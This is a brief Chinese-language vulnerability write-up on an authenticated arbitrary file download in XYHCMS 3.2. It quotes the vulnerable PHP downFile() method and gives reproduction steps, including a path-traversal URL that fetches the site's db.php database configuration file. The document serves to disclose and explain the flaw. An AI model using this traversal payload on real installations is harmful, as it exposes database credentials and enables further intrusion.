XYHCMS 3.2 后台任意文件下载
===========================

一、漏洞简介
------------

没有对下载的文件做任何限制

二、漏洞影响
------------

XYHCMS 3.2

三、复现过程
------------

### 漏洞分析

`/App/Manage/Controller/DatabaseController.class.php`的downfile()方法

    public function downFile() {  
        if (empty($_GET['file']) || empty($_GET['type']) || !in_array($_GET['type'], array("zip", "sql"))) {  
            $this->error("下载地址不存在");  
        }  
        $path     = array("zip" => $this->getDbPath() . "Zip/", "sql" => $this->getDbPath() . '/');  
        $filePath = $path[$_GET['type']] . $_GET['file'];  
        if (!file_exists($filePath)) {  
            $this->error("该文件不存在，可能是被删除");  
        }  
         $filename = basename($filePath);  
         header("Content-type: application/octet-stream");  
         header('Content-Disposition: attachment; filename="' . $filename . '"');  
         header("Content-Length: " . filesize($filePath));  
         readfile($filePath);  
     }

### 漏洞复现

1.  登录后台
2.  访问`http://www.0-sec.org/xyhai.php?s=/Database/downFile/file/..\\..\\..\\App\\Common\\Conf\\db.php/type/zip`
3.  下载到数据库配置文件
